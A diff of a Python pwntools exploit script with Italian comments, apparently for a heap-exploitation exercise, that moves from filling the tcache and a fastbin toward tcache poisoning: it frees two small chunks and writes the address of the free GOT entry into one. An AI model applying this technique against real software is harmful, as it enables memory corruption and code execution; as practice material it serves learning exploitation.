@@ -22,80 +22,37 @@ def free(pointer):
 
 def write(pointer,n,what_to_write):
 	r.sendline(b"write " + pointer + b" " + bytes(str(n),encoding="utf-8"))
-	#input("wait")
 	r.send(what_to_write)
 	r.recv()
 
 r.recvuntil(b"main: ")
 app = r.recv()[:-3]
-#print(app)
 main_address = int(app,16)
 
-print("PROVA")
+print("PROVA -> stampa main address")
 print(hex(main_address))
 
-addr_list = []
 
-for i in range(0,7):
-	print(i)
-	addr_list.append(malloc(0x60))
+c1 = malloc(0x8)
+c2 = malloc(0x8)
 
-print("SOVRASCRITTO LA TCACHE")
+print("malloc fatte")
 
-mia_malloc = malloc(0x60)
+free(c1);
+free(c2);
 
-print("la mia malloc ha questo indirizzo")
-print(mia_malloc)
-
-for i in range(0,7):
-	print(i)
-	free(addr_list[i])
-print("DEALLOCATO LA TCACHE")
-
-free(mia_malloc)
-print("DEALLOCATA LA MIA MALLOC")
+print("free fatte")
 
 offset_free_got = 0x2e04
 
-write(mia_malloc,0x10, p64(main_address+offset_free_got))
+input("wait before writing")
+write(c2, 0x10, p64(main_address+offset_free_got))
 
-print("allocazione tcache dopo la write")
-for i in range(0,7):
-	print(i)
-	malloc(0x60)
-
-print("allocazione fastbin")
-app = malloc(0x60)
-
-malloc(0x60)
+print("stampa main address + offset_free_got:")
+print(hex(main_address+offset_free_got))
+print("Scrittura dell'indirizzo dell'arbitrary chunk fatta")
 
 
 
-input("wait")
-
-
-
-
-#c1 = malloc(0x100)
-#malloc(0x10)
-#c2 = malloc(0x100)
-#malloc(0x10)
-#print("MALLOC FATTE")
-
-#free(c2)
-#free(c1)
-
-#print("FREE FATTE")
-
-
-
-#write(c2,0x10, p64(main_address + offset_free_got))
-#print("WRITE FATTA")
-
-#input("wait")
-#malloc(0x600)
-#input("malloc 1 fatta: wait")
-#malloc(0x600)
-#print("MALLOC FATTE")
 
 r.interactive()
